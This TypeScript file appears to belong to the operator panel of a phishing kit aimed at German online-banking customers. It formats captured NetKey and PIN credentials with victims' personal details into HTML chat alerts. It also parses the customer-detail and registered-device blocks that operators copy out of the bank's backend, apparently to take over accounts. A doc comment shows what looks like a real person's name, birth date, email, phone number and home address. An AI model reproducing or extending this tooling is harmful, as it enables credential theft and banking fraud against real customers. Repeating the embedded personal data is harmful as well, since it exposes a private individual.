export type QrSessionRow = {
  branch_name: string | null;
  netkey: string | null;
  pin: string | null;
  customer_anrede: string | null;
  customer_name: string | null;
  customer_number: string | null;
  customer_birthday: string | null;
  customer_address_street: string | null;
  customer_address_city: string | null;
  customer_email: string | null;
  customer_mobile: string | null;
};

export type ParsedDevice = {
  name: string;
  appId: string;
  registeredAt: string;
  online: boolean;
  cards: boolean;
};

/**
 * Parses the raw device-list block operators paste from the banking backend.
 * Each device is separated by "Gerätedetails" and shaped like:
 *
 *   iPhone
 *   App-ID
 *   GQYIQXCFZQ
 *   Registrierungsdatum
 *   11.05.2026
 *   Status
 *   Aktiv
 *   Aufträge OnlineBanking
 *   Inaktiv
 *   Mastercard® und Visacard Zahlungen
 *   Gerätedetails
 */
export function parseDevicesReply(text: string): ParsedDevice[] {
  const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
  const devices: ParsedDevice[] = [];
  let current: Partial<ParsedDevice> & { statuses?: string[] } = {};
  let expect: null | "appId" | "date" | "status" = null;

  const isActive = (s: string | undefined) =>
    !!s && /^aktiv$/i.test(s.trim());

  const push = () => {
    if (current.name || current.appId) {
      const st = current.statuses ?? [];
      // Im Banking-Backend gibt es nur zwei angezeigte Status:
      //   st[0] steht unter "Status" (= Aufträge OnlineBanking)
      //   st[1] steht unter "Mastercard® und Visacard Zahlungen" (oft leer)
      devices.push({
        name: current.name ?? "",
        appId: current.appId ?? "",
        registeredAt: current.registeredAt ?? "",
        online: isActive(st[0]),
        cards: isActive(st[1]),
      });
    }
    current = {};
    expect = null;
  };

  for (const line of lines) {
    if (/^Gerätedetails$/i.test(line)) { push(); continue; }
    if (/^App-?ID$/i.test(line)) { expect = "appId"; continue; }
    if (/^Registrierungsdatum$/i.test(line)) { expect = "date"; continue; }
    if (/^Status$/i.test(line)) { expect = "status"; continue; }
    if (/^Aufträge\s+OnlineBanking$/i.test(line)) { expect = "status"; continue; }
    if (/^Mastercard.*Visacard/i.test(line)) { expect = "status"; continue; }

    if (expect === "appId") { current.appId = line; expect = null; continue; }
    if (expect === "date") { current.registeredAt = line; expect = null; continue; }
    if (expect === "status") {
      current.statuses = current.statuses ?? [];
      current.statuses.push(line);
      expect = null;
      continue;
    }

    // Otherwise this is a device name (only the first free line per device).
    if (!current.name) current.name = line;
  }
  push();
  return devices.filter((d) => d.name || d.appId);
}

const esc = (s: string) => s.replace(/[&<>]/g, (c) => (c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;"));
const v = (s: string | null | undefined) => (s && s.trim() ? esc(s.trim()) : "—");

export function renderSessionSummary(row: QrSessionRow, extras?: { operatorAppended?: boolean; customerAppended?: boolean }): string {
  const hasCustomer = Boolean(
    row.customer_name || row.customer_number || row.customer_birthday ||
    row.customer_address_street || row.customer_address_city,
  );
  const hasContact = Boolean(row.customer_email || row.customer_mobile);
  const lines = [
    "🔐 <b>QR-Login-Versuch</b>",
    `<b>Bank:</b> ${v(row.branch_name)}`,
    `<b>NetKey:</b> <code>${v(row.netkey)}</code>`,
    `<b>PIN:</b> <code>${v(row.pin)}</code>`,
  ];
  if (hasCustomer) {
    lines.push("", "👤 <b>Kundendaten</b>");
    if (row.customer_anrede) lines.push(`<b>Anrede:</b> ${v(row.customer_anrede)}`);
    lines.push(`<b>Name:</b> ${v(row.customer_name)}`);
    lines.push(`<b>KundenNr:</b> <code>${v(row.customer_number)}</code>`);
    lines.push(`<b>Geburtstag:</b> ${v(row.customer_birthday)}`);
    const addr = [row.customer_address_street, row.customer_address_city].filter(Boolean).join(", ");
    lines.push(`<b>Adresse:</b> ${addr ? esc(addr) : "—"}`);
  }
  if (hasContact || extras?.customerAppended) {
    lines.push("", "✍ <b>Vom Kunden ergänzt</b>");
    lines.push(`<b>E-Mail:</b> ${v(row.customer_email)}`);
    lines.push(`<b>Mobil:</b> ${v(row.customer_mobile)}`);
  }
  return lines.join("\n");
}

const KEY_ALIASES: Record<string, string> = {
  anrede: "customer_anrede", salutation: "customer_anrede",
  name: "customer_name", kundenname: "customer_name",
  kundennr: "customer_number", kdnr: "customer_number", kundennummer: "customer_number",
  geburtstag: "customer_birthday", geburtsdatum: "customer_birthday", gebdatum: "customer_birthday", gebtag: "customer_birthday",
  adresse: "customer_address_street", strasse: "customer_address_street", straße: "customer_address_street", street: "customer_address_street",
  plzort: "customer_address_city", ort: "customer_address_city", stadt: "customer_address_city", city: "customer_address_city",
  email: "customer_email", mail: "customer_email", "e-mail": "customer_email",
  mobil: "customer_mobile", handy: "customer_mobile", mobile: "customer_mobile", tel: "customer_mobile", telefon: "customer_mobile",
};

export function parseOperatorReply(text: string): Partial<QrSessionRow> {
  const patch: Partial<QrSessionRow> = {};
  const lines = text.split(/\r?\n/);
  let vorname = "";
  let nachname = "";
  for (const line of lines) {
    const m = line.match(/^\s*([\wäöüÄÖÜß\-\s]+?)\s*[:=]\s*(.+?)\s*$/);
    if (!m) continue;
    const rawKey = m[1]!.trim().toLowerCase().replace(/\s+/g, "");
    const value = m[2]!.trim();
    if (!value) continue;
    if (rawKey === "vorname") { vorname = value; continue; }
    if (rawKey === "nachname") { nachname = value; continue; }
    const col = KEY_ALIASES[rawKey];
    if (col) (patch as any)[col] = value;
  }
  if ((vorname || nachname) && !patch.customer_name) {
    patch.customer_name = [vorname, nachname].filter(Boolean).join(" ");
  }
  // Fill any missing fields via the freeform/label-based parser so that
  // operators can paste the raw customer-detail block from the banking UI.
  const free = parseFreeformReply(text);
  for (const [k, val] of Object.entries(free)) {
    if (val && !(patch as any)[k]) (patch as any)[k] = val;
  }
  return patch;
}

/**
 * Parses the multi-line "customer details" block operators paste from the
 * banking backend, e.g.:
 *
 *   Herr
 *   Andreas Remke
 *   Kunden-Nr. 21474000
 *   ic_kuchen_24
 *   07.11.1966
 *   ic_ringe_24
 *   verheiratet
 *   Kontakt
 *   E-Mail (privat)
 *   andiremke@aol.com
 *   Festnetz (privat)
 *   0211234600
 *   Adressen
 *   Hauptadresse (Wohnsitz)
 *   Römerstr. 11
 *   77933 Lahr
 */
export function parseFreeformReply(text: string): Partial<QrSessionRow> {
  const patch: Partial<QrSessionRow> = {};
  const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);

  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const dateRe = /^\d{1,2}\.\d{1,2}\.\d{2,4}$/;
  const plzCityRe = /^\d{5}\s+\S/;
  const phoneRe = /^[+\d][\d\s/()\-]{5,}$/;
  const anredeRe = /^(Herr|Frau|Divers|Firma|Herrn)$/i;
  const nameRe = /^[A-ZÄÖÜ][A-Za-zÄÖÜäöüß\-]+(?:\s+[A-ZÄÖÜ][A-Za-zÄÖÜäöüß\-\.]+)+$/;

  let expect: null | "email" | "phone" | "street" | "city" = null;

  for (const line of lines) {
    // Skip icon placeholders like "ic_kuchen_24".
    if (/^ic_[\w]+$/i.test(line)) continue;

    if (expect === "email") {
      if (!patch.customer_email && emailRe.test(line)) patch.customer_email = line;
      expect = null;
      continue;
    }
    if (expect === "phone") {
      if (!patch.customer_mobile && phoneRe.test(line)) patch.customer_mobile = line;
      expect = null;
      continue;
    }
    if (expect === "street") {
      // Skip nested labels like "Hauptadresse (Wohnsitz)" that follow "Adressen".
      if (/^(Hauptadresse|Wohnsitz|Weitere\s+Adresse|Postadresse|Nebenadresse)\b/i.test(line)) {
        continue;
      }
      if (!patch.customer_address_street) patch.customer_address_street = line;
      expect = "city";
      continue;
    }
    if (expect === "city") {
      if (plzCityRe.test(line) && !patch.customer_address_city) patch.customer_address_city = line;
      expect = null;
      continue;
    }

    // Label lines: the value is on the next line.
    if (/^E-?Mail\b/i.test(line)) { expect = "email"; continue; }
    if (/^(Festnetz|Telefon|Mobil|Handy|Tel\.?)\b/i.test(line)) { expect = "phone"; continue; }
    if (/^Adressen?$/i.test(line)) {
      // Section header — the actual "Hauptadresse (Wohnsitz)" label comes next.
      continue;
    }
    if (/^Hauptadresse\b/i.test(line) || /^Wohnsitz\b/i.test(line)) {
      expect = "street";
      continue;
    }
    // Pure section headers we can ignore.
    if (/^(Kontakt|Persönliche\s+Daten|Stammdaten)$/i.test(line)) continue;
    if (/^(verheiratet|ledig|geschieden|verwitwet|getrennt)$/i.test(line)) continue;

    if (!patch.customer_anrede && anredeRe.test(line)) {
      patch.customer_anrede = /^Herrn$/i.test(line) ? "Herr" : line;
      continue;
    }

    const kn = line.match(/^Kunden-?Nr\.?\s*:?\s*(.+)$/i);
    if (kn) { if (!patch.customer_number) patch.customer_number = kn[1]!.trim(); continue; }

    if (!patch.customer_birthday && dateRe.test(line)) { patch.customer_birthday = line; continue; }

    if (!patch.customer_email && emailRe.test(line)) { patch.customer_email = line; continue; }

    if (!patch.customer_mobile && phoneRe.test(line) && !/[a-zA-ZäöüÄÖÜß]/.test(line)) {
      patch.customer_mobile = line;
      continue;
    }

    if (!patch.customer_name && nameRe.test(line)) { patch.customer_name = line; continue; }

    // Fallback: a line with digits + letters that isn't a date/phone is treated as a street.
    if (!patch.customer_address_street && /\d/.test(line) && /[a-zA-ZäöüÄÖÜß]/.test(line) && !dateRe.test(line)) {
      patch.customer_address_street = line;
      expect = "city";
      continue;
    }

    if (!patch.customer_address_city && plzCityRe.test(line)) {
      patch.customer_address_city = line;
      continue;
    }
  }

  return patch;
}
